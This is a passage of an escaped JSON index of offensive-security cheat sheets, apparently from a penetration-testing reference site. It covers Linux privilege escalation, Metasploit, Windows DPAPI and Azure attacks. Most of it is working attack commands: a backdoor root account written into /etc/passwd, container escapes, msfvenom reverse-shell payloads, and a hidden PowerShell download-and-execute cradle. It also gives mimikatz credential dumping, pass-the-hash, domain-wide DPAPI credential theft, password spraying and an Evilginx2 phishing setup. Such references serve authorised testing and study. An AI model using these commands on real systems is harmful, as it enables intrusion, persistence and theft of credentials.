edit the /etc/passwd as root, then add a backdoor account toor:password.\n$\u0026gt; docker run -it --rm -v $PWD:/mnt bash $\u0026gt; echo \u0026#39;toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh\u0026#39; \u0026gt;\u0026gt; /mnt/etc/passwd Almost similar but you will also see all processes running on the host and be connected to the same NICs.\ndocker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash Or use the following docker image from chrisfosterelli to spawn a root shell\n$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease latest: Pulling from chrisfosterelli/rootplease 2de59b831a23: Pull complete 354c3661655e: Pull complete 91930878a2d7: Pull complete a3ed95caeb02: Pull complete 489b110c54dc: Pull complete Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0 Status: Downloaded newer image for chrisfosterelli/rootplease:latest You should now have a root shell on the host OS Press Ctrl-D to exit the docker instance / shell sh-5.0# id uid=0(root) gid=0(root) groups=0(root) More docker privilege escalation using the Docker Socket.\nsudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh LXC/LXD # The privesc requires to run a container with elevated privileges and mount the host filesystem inside.\n╭─swissky@lab ~ ╰─$ id uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel) Build an Alpine image and start it using the flag security.privileged=true, forcing the container to interact as root with the host filesystem.\n# build a simple alpine image git clone https://github.com/saghul/lxd-alpine-builder ./build-alpine -a i686 # import the image lxc image import ./alpine.tar.gz --alias myimage # run the image lxc init myimage mycontainer -c security.privileged=true # mount the /root into the image lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true # interact with the container lxc start mycontainer lxc exec mycontainer /bin/sh Alternatively https://github.com/initstring/lxd_root\nHijack TMUX session # Require a read access to the tmux socket : /tmp/tmux-1000/default.\nexport TMUX=/tmp/tmux-1000/default,1234,0 tmux ls Kernel Exploits # Precompiled exploits can be found inside these repositories, run them at your own risk !\nbin-sploits - @offensive-security kernel-exploits - @lucyoa The following exploits are known to work well, search for more exploits with searchsploit -w linux kernel centos.\nAnother way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing uname -a Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.\nCVE-2022-0847 (DirtyPipe) # Linux Privilege Escalation - Linux Kernel 5.8 \u0026lt; 5.16.11\nhttps://www.exploit-db.com/exploits/50808 CVE-2016-5195 (DirtyCow) # Linux Privilege Escalation - Linux Kernel \u0026lt;= 3.19.0-73.8\n# make dirtycow stable echo 0 \u0026gt; /proc/sys/vm/dirty_writeback_centisecs g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c CVE-2010-3904 (RDS) # Linux RDS Exploit - Linux Kernel \u0026lt;= 2.6.36-rc8\nhttps://www.exploit-db.com/exploits/15285/ CVE-2010-4258 (Full Nelson) # Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)\nhttps://www.exploit-db.com/exploits/15704/ CVE-2012-0056 (Mempodipper) # Linux Kernel 2.6.39 \u0026lt; 3.2.2 (Gentoo / Ubuntu x86/x64)\nhttps://www.exploit-db.com/exploits/18411 References # SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m Privilege escalation via Docker - April 22, 2015 - Chris Foster An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018 Exploiting wildcards on Linux - Berislav Kucan Code Execution With Tar Command - p4pentest Back To The Future: Unix Wildcards Gone Wild - Leon Juranic HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018 Privilege Escalation via lxd - @reboare Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018 Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates Local Privilege Escalation Workshop - Slides.pdf - @sagishahar SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs The Dirty Pipe Vulnerability "},{"id":22,"href":"/docs/metasploit_cheatsheet/","title":"Metasploit","section":"Docs","content":" Metasploit # Installation # curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \u0026gt; msfinstall \u0026amp;\u0026amp; chmod 755 msfinstall \u0026amp;\u0026amp; ./msfinstall or docker\nsudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit Sessions # CTRL+Z -\u0026gt; Session in Background sessions -\u0026gt; List sessions sessions -i session_number -\u0026gt; Interact with Session with id sessions -u session_number -\u0026gt; Upgrade session to a meterpreter sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-\u0026gt; Upgrade session to a meterpreter sessions -c cmd -\u0026gt; Execute a command on several sessions sessions -i 10-20 -c \u0026#34;id\u0026#34; -\u0026gt; Execute a command on several sessions Background handler # ExitOnSession : the handler will not exit if the meterpreter dies.\nscreen -dRR sudo msfconsole use exploit/multi/handler set PAYLOAD generic/shell_reverse_tcp set LHOST 0.0.0.0 set LPORT 4444 set ExitOnSession false generate -o /tmp/meterpreter.exe -f exe to_handler [ctrl+a] + [d] Meterpreter - Basic # Generate a meterpreter # $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f elf \u0026gt; shell.elf $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f exe \u0026gt; shell.exe $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f macho \u0026gt; shell.macho $ msfvenom -p php/meterpreter_reverse_tcp LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f raw \u0026gt; shell.php; cat shell.php | pbcopy \u0026amp;\u0026amp; echo \u0026#39;\u0026lt;?php \u0026#39; | tr -d \u0026#39;\\n\u0026#39; \u0026gt; shell.php \u0026amp;\u0026amp; pbpaste \u0026gt;\u0026gt; shell.php $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f asp \u0026gt; shell.asp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f raw \u0026gt; shell.jsp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f war \u0026gt; shell.war $ msfvenom -p cmd/unix/reverse_python LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f raw \u0026gt; shell.py $ msfvenom -p cmd/unix/reverse_bash LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f raw \u0026gt; shell.sh $ msfvenom -p cmd/unix/reverse_perl LHOST=\u0026#34;10.10.10.110\u0026#34; LPORT=4242 -f raw \u0026gt; shell.pl Meterpreter Webdelivery # Set up a Powershell web delivery listening on port 8080.\nuse exploit/multi/script/web_delivery set TARGET 2 set payload windows/x64/meterpreter/reverse_http set LHOST 10.0.0.1 set LPORT 4444 run powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring(\u0026#39;http://10.0.0.1:8080/rYDPPB\u0026#39;); Get System # meterpreter \u0026gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM Persistence Startup # OPTIONS: -A Automatically start a matching exploit/multi/handler to connect to the agent -L \u0026lt;opt\u0026gt; Location in target host to write payload to, if none %TEMP% will be used. -P \u0026lt;opt\u0026gt; Payload to use, default is windows/meterpreter/reverse_tcp. -S Automatically start the agent on boot as a service (with SYSTEM privileges) -T \u0026lt;opt\u0026gt; Alternate executable template to use -U Automatically start the agent when the User logs on -X Automatically start the agent when the system boots -h This help menu -i \u0026lt;opt\u0026gt; The interval in seconds between each connection attempt -p \u0026lt;opt\u0026gt; The port on which the system running Metasploit is listening -r \u0026lt;opt\u0026gt; The IP of the system running Metasploit listening for the connect back meterpreter \u0026gt; run persistence -U -p 4242 Network Monitoring # # list interfaces run packetrecorder -li # record interface n°1 run packetrecorder -i 1 Portforward # portfwd add -l 7777 -r 172.17.0.2 -p 3006 Upload / Download # upload /path/in/hdd/payload.exe exploit.exe download /path/in/victim Execute from Memory # execute -H -i -c -m -d calc.exe -f /root/wce.exe -a -w Mimikatz # load mimikatz mimikatz_command -f version mimikatz_command -f samdump::hashes mimikatz_command -f sekurlsa::wdigest mimikatz_command -f sekurlsa::searchPasswords mimikatz_command -f sekurlsa::logonPasswords full load kiwi creds_all golden_ticket_create -d \u0026lt;domainname\u0026gt; -k \u0026lt;nthashof krbtgt\u0026gt; -s \u0026lt;SID without le RID\u0026gt; -u \u0026lt;user_for_the_ticket\u0026gt; -t \u0026lt;location_to_store_tck\u0026gt; Pass the Hash - PSExec # msf \u0026gt; use exploit/windows/smb/psexec msf exploit(psexec) \u0026gt; set payload windows/meterpreter/reverse_tcp msf exploit(psexec) \u0026gt; exploit SMBDomain WORKGROUP no The Windows domain to use for authentication SMBPass 598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf no The password for the specified username SMBUser Lambda no The username to authenticate as Use SOCKS Proxy # setg Proxies socks4:127.0.0.1:1080 Scripting Metasploit # Using a .rc file, write the commands to execute, then run msfconsole -r ./file.rc. Here is a simple example to script the deployment of a handler an create an Office doc with macro.\nuse exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_https set LHOST 0.0.0.0 set LPORT 4646 set ExitOnSession false exploit -j -z use exploit/multi/fileformat/office_word_macro set PAYLOAD windows/meterpreter/reverse_https set LHOST 10.10.14.22 set LPORT 4646 exploit Multiple transports # msfvenom -p windows/meterpreter_reverse_tcp lhost=\u0026lt;host\u0026gt; lport=\u0026lt;port\u0026gt; sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe Then, in AddTransports.ps1\nAdd-TcpTransport -lhost \u0026lt;host\u0026gt; -lport \u0026lt;port\u0026gt; -RetryWait 10 -RetryTotal 30 Add-WebTransport -Url http(s)://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;luri\u0026gt; -RetryWait 10 -RetryTotal 30 Best of - Exploits # MS17-10 Eternal Blue - exploit/windows/smb/ms17_010_eternalblue MS08_67 - exploit/windows/smb/ms08_067_netapi References # Multiple transports in a meterpreter payload - ionize Creating Metasploit Payloads - Peleus "},{"id":23,"href":"/docs/windows_dpapi/","title":"Microsoft Window's Data Protection API","section":"Docs","content":" Windows - DPAPI # On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft\u0026rsquo;s Data Protection API and stored as \u0026ldquo;blob\u0026rdquo; files in user AppData folder.\nSummary # Data Protection API List Credential Files Mimikatz - Credential Manager \u0026amp; DPAPI Hekatomb - Steal all credentials on domain DonPAPI - Dumping DPAPI credz remotely Data Protection API # Outside of a domain: the user\u0026rsquo;s password hash is used to encrypt these \u0026ldquo;blobs\u0026rdquo;. Inside a domain: the domain controller's master key is used to encrypt these blobs. With the extracted private key of the domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows identification manager of all the work\nstations in the domain.\nvaultcmd /list VaultCmd /listcreds:\u0026lt;namevault\u0026gt;|\u0026lt;guidvault\u0026gt; /all vaultcmd /listcreds:\u0026#34;Windows Credentials\u0026#34; /all List Credential Files # dir /a:h C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ dir /a:h C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ Mimikatz - Credential Manager \u0026amp; DPAPI # # check the folder to find credentials dir C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Credentials\\* # check the file with mimikatz mimikatz dpapi::cred /in:C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 # find master key mimikatz !sekurlsa::dpapi # use master key mimikatz dpapi::cred /in:C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b # find and export backup keys lsadump::backupkeys /system:dc01.lab.local /export # use backup keys dpapi::masterkey /in:\u0026#34;C:\\Users\\\u0026lt;USERNAME\u0026gt;\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\u0026#34; /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk Hekatomb - Steal all credentials on domain # Processus-Thief/Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.\npip3 install hekatomb hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp DonPAPI - Dumping DPAPI credz remotely # login-securite/DonPAPI DonPAPI.py domain/user:passw0rd@target DonPAPI.py --hashes \u0026lt;LM\u0026gt;:\u0026lt;NT\u0026gt; domain/user@target # using domain backup key dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list References # DPAPI - Extracting Passwords - HackTricks DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 4 MARS 2022 "},{"id":24,"href":"/docs/microsoft_azure_cloud/","title":"Microsoft's Azure Cloud","section":"Docs","content":" Cloud - Azure # Azure Recon Tools # ROADTool - The Azure AD exploration framework.\npipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] roadrecon auth -u test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -p \u0026lt;PASSWORD\u0026gt; roadrecon gather roadrecon gui Azure/StormSpotter - Azure Red Team tool for graphing Azure and Azure Active Directory objects\n# session 1 - backend pipenv shell python ssbackend.pyz # session 2 - frontend cd C:\\Tools\\stormspotter\\frontend\\dist\\spa\\ quasar.cmd serve -p 9091 --history # session 3 - collector pipenv shell az login -u test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -p \u0026lt;PASSWORD\u0026gt; python C:\\Tools\\stormspotter\\stormcollector\\sscollector.pyz cli # Web access on http://localhost:9091 Username: neo4j Password: BloodHound Server: bolt://localhost:7687 BloodHoundAD/AzureHound - Azure Data Exporter for BloodHound\n./azurehound configure ./azurehound -u \u0026#34;MattNelson@contoso.onmicrosoft.com\u0026#34; -p \u0026#34;MyVerySecurePassword123\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list ./azurehound -u \u0026#34;phisheduser@contoso.onmicrosoft.com\u0026#34; -p \u0026#34;Password1\u0026#34; list -o initial-scan.json --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; ./azurehound -a \u0026#34;6b5adee8-...\u0026#34; -s \u0026#34;\u0026lt;secret\u0026gt;\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list ./azurehound -j \u0026#34;ey...\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list az-ad ./azurehound -r \u0026#34;0.ARwA6Wg...\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list users # List of collections az-ad: Collect all information available at the AzureAD tenant level. In most tenants, all users have the ability to read all this information by default. az-rm: Collect all information available at the AzureRM subscription level. Users do not by default have read access to any of this information. apps: Collects AzureAD application registration objects. devices: Collects AzureAD devices regardless of join type. groups: Collects AzureAD security-enabled groups, both role eligible and non role eligible. key-vaults: Collects AzureRM key vaults. management-groups: Collects AzureRM management group objects resource-groups: Collects AzureRM resource group objects roles: Collects AzureAD admin role objects service-principals: Collects AzureAD service principals subscriptions: Collevts AzureRM subscriptions tenants: Collevts AzureAD tenant objects users: Collects AzureAD users, including any guest users in the target tenant. virtual-machines: Collects AzureRM virtual machines # GUI access bolt://localhost:7687 Username: neo4j Password: BloodHound # Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/ # Cypher query examples: MATCH p = (n)-[r]-\u0026gt;(g:AZKeyVault) RETURN p MATCH (n) WHERE n.azname IS NOT NULL AND n.azname \u0026lt;\u0026gt; \u0026#34;\u0026#34; AND n.name IS NULL SET n.name = n.azname BloodHoundAD/BARK - BloodHound Attack Research Kit\n. .\\BARK.ps1 $MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword -username \u0026#34;user@contoso.onmicrosoft.com\u0026#34; -password \u0026#34;MyVeryCoolPassword\u0026#34; -TenantID \u0026#34;contoso.onmicrosoft.com\u0026#34; $MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID \u0026#34;contoso.onmicrosoft.com\u0026#34; $MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress Microsoft Portals - Microsoft Administrator Sites\nnccgroup/Azucar : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.\n# You should use an account with at least read-permission on the assets you want to access PS\u0026gt; Get-ChildItem -Recurse c:\\Azucar_V10 | Unblock-File PS\u0026gt; .\\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT PS\u0026gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 PS\u0026gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 # resolve the TenantID for an specific username PS\u0026gt; .\\Azucar.ps1 -ResolveTenantUserName user@company.com FSecureLABS/Azurite Explorer and Azurite Visualizer : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.\ngit submodule init git submodule update PS\u0026gt; Import-Module AzureRM PS\u0026gt; Import-Module AzuriteExplorer.ps1 PS\u0026gt; Review-AzureRmSubscription PS\u0026gt; Review-CustomAzureRmSubscription NetSPI/MicroBurst - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping\nPS C:\u0026gt; Import-Module .\\MicroBurst.psm1 PS C:\u0026gt; Import-Module .\\Get-AzureDomainInfo.ps1 PS C:\u0026gt; Get-AzureDomainInfo -folder MicroBurst -Verbose cyberark/SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.\nRequire:\nRead-Only permissions over Azure Directory (Tenant) Read-Only permissions over Subscription Require AZ and AzureAD module or administrator right $ powershell -ExecutionPolicy Bypass -NoProfile PS C\u0026gt; Import-Module .\\SkyArk.ps1 -force PS C\u0026gt; Start-AzureStealth PS C\u0026gt; IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1\u0026#39;) PS C\u0026gt; Scan-AzureAdmins hausec/PowerZure - PowerShell framework to assess Azure security\n# Require az module ! $ ipmo .\\PowerZure $ Set-Subscription -Id [idgoeshere] # Reader $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails # Contributor $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command \u0026#34;whoami\u0026#34; $ Execute-MSBuild -VM Win10Test -ResourceGroup Test-RG -File \u0026#34;build.xml\u0026#34; $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine\u0026#39;s disk # Owner $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest # Administrator $ Create-Backdoor, Execute-Backdoor Terminology # Basic Azure AD terminologies\nTenant: An instance of Azure AD and represents a single organization. Azure AD Directory: Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources. Subscriptions: It is used to pay for services. There can be multiple subscriptions in a Directory. Core Domain: The initial domain name .onmicrosoft.com is the core domain. It is possible to define custom domain names too. Enumeration # Enumerate valid emails # By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.\nValidate email PS\u0026gt; C:\\Python27\\python.exe C:\\Tools\\o365creeper\\o365creeper.py -f C:\\Tools\\emails.txt -o C:\\Tools\\validemails.txt admin@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - VALID root@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - INVALID test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - VALID contact@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - INVALID Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon Password spraying # PS\u0026gt; . C:\\Tools\\MSOLSpray\\MSOLSpray.ps1 PS\u0026gt; Invoke-MSOLSpray -UserList C:\\Tools\\validemails.txt -Password \u0026lt;PASSWORD\u0026gt; -Verbose Enumerate Azure Subdomains # PS\u0026gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureSubDomains.ps1 PS\u0026gt; Invoke-EnumerateAzureSubDomains -Base \u0026lt;TENANT NAME\u0026gt; -Verbose Subdomain Service --------- ------- \u0026lt;TENANT NAME\u0026gt;.mail.protection.outlook.com Email \u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com Microsoft Hosted Domain Enumerate tenant with Azure AD Powershell # Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 Import-Module C:\\Tools\\AzureADPreview\\AzureADPreview.psd1 PS\u0026gt; $passwd = ConvertTo-SecureString \u0026#34;\u0026lt;PASSWORD\u0026gt;\u0026#34; -AsPlainText -Force PS\u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#34;test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026#34;, $passwd) PS Az\u0026gt; Connect-AzureAD -Credential $creds PS AzureAD\u0026gt; Get-AzureADUser -All $true PS AzureAD\u0026gt; Get-AzureADUser -All $true | select UserPrincipalName PS AzureAD\u0026gt; Get-AzureADGroup -All $true PS AzureAD\u0026gt; Get-AzureADDevice PS AzureAD\u0026gt; Get-AzureADDirectoryRole -Filter \u0026#34;DisplayName eq \u0026#39;Global Administrator\u0026#39;\u0026#34; | Get-AzureADDirectoryRoleMember PS AzureADPreview\u0026gt; Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName Enumerate tenant with Az Powershell # PS\u0026gt; $passwd = ConvertTo-SecureString \u0026#34;\u0026lt;PASSWORD\u0026gt;\u0026#34; -AsPlainText -Force PS\u0026gt; $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026#34;, $passwd) PS Az\u0026gt; Connect-AzAccount -Credential $creds PS Az\u0026gt; Get-AzResource PS Az\u0026gt; Get-AzRoleAssignment -SignInName test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com PS Az\u0026gt; Get-AzVM | fl PS Az\u0026gt; Get-AzWebApp | ?{$_.Kind -notmatch \u0026#34;functionapp\u0026#34;} PS Az\u0026gt; Get-AzFunctionApp PS Az\u0026gt; Get-AzStorageAccount | fl PS Az\u0026gt; Get-AzKeyVault Enumerate tenant with az cli # PS\u0026gt; az login -u test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -p \u0026lt;PASSWORD\u0026gt; PS\u0026gt; az vm list PS\u0026gt; az vm list --query \u0026#34;[].[name]\u0026#34; -o table PS\u0026gt; az webapp list PS\u0026gt; az functionapp list --query \u0026#34;[].[name]\u0026#34; -o table PS\u0026gt; az storage account list PS\u0026gt; az keyvault list Enumerate manually # Federation with Azure AD or O365 https://login.microsoftonline.com/getuserrealm.srf?login=\u0026lt;USER\u0026gt;@\u0026lt;DOMAIN\u0026gt;\u0026amp;xml=1 https://login.microsoftonline.com/getuserrealm.srf?login=root@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026amp;xml=1 Get the Tenant ID https://login.microsoftonline.com/\u0026lt;DOMAIN\u0026gt;/.well-known/openid-configuration https://login.microsoftonline.com/\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com/.well-known/openid-configuration Enumeration methodology # # Check Azure Joined PS\u0026gt; dsregcmd.exe /status +----------------------------------------------------------------------+ | Device State | +----------------------------------------------------------------------+ AzureAdJoined : YES EnterpriseJoined : NO DomainJoined : NO Device Name : jumpvm # Enumerate resources PS Az\u0026gt; Get-AzResource # Enumerate role assignments PS Az\u0026gt; Get-AzRoleAssignment -Scope /subscriptions/\u0026lt;SUBSCRIPTION-ID\u0026gt;/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/\u0026lt;VM-NAME\u0026gt;` # Get info on a role PS Az\u0026gt; Get-AzRoleDefinition -Name \u0026#34;Virtual Machine Command Executor\u0026#34; # Get info user PS AzureAD\u0026gt; Get-AzureADUser -ObjectId \u0026lt;ID\u0026gt; PS AzureAD\u0026gt; Get-AzureADUser -ObjectId test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com | fl * # List all groups PS AzureAD\u0026gt; Get-AzureADGroup -All $true # Get members of a group PS Az\u0026gt; Get-AzADGroup -DisplayName \u0026#39;\u0026lt;GROUP-NAME\u0026gt;\u0026#39; PS Az\u0026gt; Get-AzADGroupMember -GroupDisplayName \u0026#39;\u0026lt;GROUP-NAME\u0026gt;\u0026#39; | select UserPrincipalName # Get Azure AD information PS\u0026gt; Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals\u0026gt; Get-AADIntLoginInformation -UserName admin@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com PS AADInternals\u0026gt; Get-AADIntTenantID -Domain \u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com # Get Tenant ID PS AADInternals\u0026gt; Invoke-AADIntReconAsOutsider -DomainName \u0026lt;DOMAIN\u0026gt; # Get all the information # Check if there is a user logged-in to az cli PS\u0026gt; az ad signed-in-user show # Check AppID Alternative Names/Display Name PS AzureAD\u0026gt; Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq \u0026#34;\u0026lt;APP-ID\u0026gt;\u0026#34;} | fl # Get all application objects registered using the current tenant PS AzureAD\u0026gt; Get-AzureADApplication -All $true # Get all details about an application PS AzureAD\u0026gt; Get-AzureADApplication -ObjectId \u0026lt;ID\u0026gt; | fl * # List all VM\u0026#39;s the user has access to PS Az\u0026gt; Get-AzVM PS Az\u0026gt; Get-AzVM | fl # Get all function apps PS Az\u0026gt; Get-AzFunctionApp # Get all webapps PS Az\u0026gt; Get-AzWebApp PS Az\u0026gt; Get-AzWebApp | select-object Name, Type, Hostnames # List all storage accounts PS Az\u0026gt; Get-AzStorageAccount PS Az\u0026gt; Get-AzStorageAccount | fl # List all keyvaults PS Az\u0026gt; Get-AzKeyVault Phishing with Evilginx2 # PS C:\\Tools\u0026gt; evilginx2 -p C:\\Tools\\evilginx2\\phishlets : config domain username.corp : config ip 10.10.10.10 : phishlets hostname o365 login.username.corp : phishlets get-hosts o365 Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine # copy certificate and enable the phishing PS C:\\Tools\u0026gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\ca.crt C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.crt PS C:\\Tools\u0026gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\private.key C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.key : phishlets enable o365 # get the phishing URL : lures create o365 : lures get-url 0 Illicit Consent Grant # The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to.\nCheck if users are allowed to consent to apps: PS AzureADPreview\u0026gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole\nDisable user consent : Users cannot grant permissions to applications. Users can consent to apps from verified publishers or your organization, but only for permissions you select : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant Users can consent to all apps : allows all users to consent to any permission which doesn\u0026rsquo;t require admin consent, Custom app consent policy Register Application # Login to https://portal.azure.com \u0026gt; Azure Active Directory Click on App registrations \u0026gt; New registration Enter the Name for 